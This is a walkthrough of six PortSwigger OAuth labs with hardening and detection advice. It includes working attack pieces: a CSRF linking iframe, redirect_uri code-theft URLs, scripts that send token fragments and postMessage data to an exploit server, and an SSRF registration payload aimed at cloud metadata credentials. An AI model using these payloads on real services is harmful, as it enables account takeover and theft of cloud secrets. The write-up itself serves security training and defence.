# PortSwigger OAuth Authentication 1-6 — Bind Subject, Redirect, and State

This is a consolidated walkthrough of the six PortSwigger OAuth Authentication labs.

All labs were solved in the authorized Web Security Academy environment. The main lesson is that OAuth security depends on binding the same subject, redirect, state, client, and token audience across all parties. A working login at the identity provider is only one part of the protocol.

## 1. Overview

| # | Lab | Broken binding | Core idea |
|---|-----|----------------|-----------|
| 1 | implicit flow auth bypass | token not bound to submitted profile | change `/authenticate` email to Carlos |
| 2 | OpenID dynamic registration SSRF | server fetches attacker-controlled client metadata | `logo_uri` points at cloud metadata |
| 3 | forced profile linking | no `state` on linking flow | CSRF attacker OAuth code into admin session |
| 4 | account hijacking via `redirect_uri` | arbitrary redirect URI | steal admin authorization code |
| 5 | token theft via open redirect | loose redirect URI plus client open redirect | send token fragment to exploit server |
| 6 | token theft via proxy page | redirect traversal plus postMessage `*` | comment-form iframe leaks full URL |

## 2. Triage model

For each OAuth flow, map:

```text
/auth -> login/consent -> redirect_uri -> client callback -> /me or /userinfo
```

Then check:

- whether `state` exists and is bound to the browser session;
- whether `redirect_uri` is an exact registered value;
- whether the client validates the token's subject server-side;
- whether tokens arrive in query, fragment, or body;
- whether client pages can act as open redirects or proxy pages;
- whether OIDC dynamic registration fetches attacker-controlled URLs.

## 3. Client-side trust and linking CSRF

The implicit-flow lab ends with:

```http
POST /authenticate
```

The client accepts the email sent from the browser instead of validating it against the access token. Changing the email to:

```text
carlos@carlos-montoya.net
```

logs in as Carlos.

The forced-linking lab lacks `state` on `/oauth-linking`. Generate a code for the attacker's social account, intercept the callback, and drop it so the code remains unused. Then make the victim load:

```html
<iframe src="https://LAB/oauth-linking?code=<attacker-code>"></iframe>
```

The victim's active blog session is linked to the attacker's social profile.

## 4. Redirect URI failures

If the provider accepts arbitrary `redirect_uri`, an iframe can send the victim's authorization code to the exploit server. The stolen code is then replayed at the legitimate client callback:

```text
https://LAB/oauth-callback?code=<victim-code>
```

If the provider allows traversal inside an otherwise valid callback, combine it with a client-side open redirect:

```text
https://LAB/oauth-callback/../post/next?path=https://EXPLOIT-SERVER/exploit
```

For implicit flow, the access token is in the fragment. The exploit server needs a tiny script to convert it into a query string:

```js
window.location = '/?' + document.location.hash.substr(1)
```

## 5. Proxy pages and OpenID SSRF

The expert token-theft lab uses a client page as a proxy. The comment form posts its full `window.location.href` to any parent origin. Send the OAuth token to that page:

```text
/oauth-callback/../post/comment/comment-form
```

Then listen for the message and log it:

```js
window.addEventListener('message', e => {
  fetch('/' + encodeURIComponent(e.data.data))
})
```

The dynamic-client-registration lab is an OpenID Connect SSRF. Discovery reveals `/reg`, and unauthenticated registration accepts `logo_uri`:

```json
{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Requesting `/client/<client_id>/logo` makes the OAuth server fetch the metadata URL and return the secret access key.

## 6. Defense and detection

Hardening:

- Validate user identity server-side using the access token against `/userinfo`.
- Use authorization code flow with PKCE instead of implicit flow where possible.
- Require `state` for login, linking, and consent actions.
- Bind authorization codes to `client_id`, exact `redirect_uri`, session, and PKCE verifier.
- Enforce exact redirect URI matching.
- Treat dynamic client registration as privileged, or sandbox and allowlist all fetchable metadata URLs.
- Never post full URLs containing tokens with `postMessage('*')`.
- Scope access tokens tightly and bind them to the intended resource server.

Detection:

- `/authenticate` profile values that disagree with the identity provider.
- OAuth callbacks or linking endpoints missing `state`.
- `redirect_uri` containing `../`, nested URLs, open-redirect parameters, or external domains.
- Dynamic client registrations with private IPs or metadata endpoints in `logo_uri`.
- Iframed `/auth` requests from unexpected origins.
- `/me` API calls with bearer tokens that do not match the current browser session.
- postMessage payloads containing `access_token`.

No lab in this series required new user-supplied Collaborator/OAST data. The OIDC SSRF lab's official Collaborator check is only a reachability proof; the solved target is the metadata endpoint.
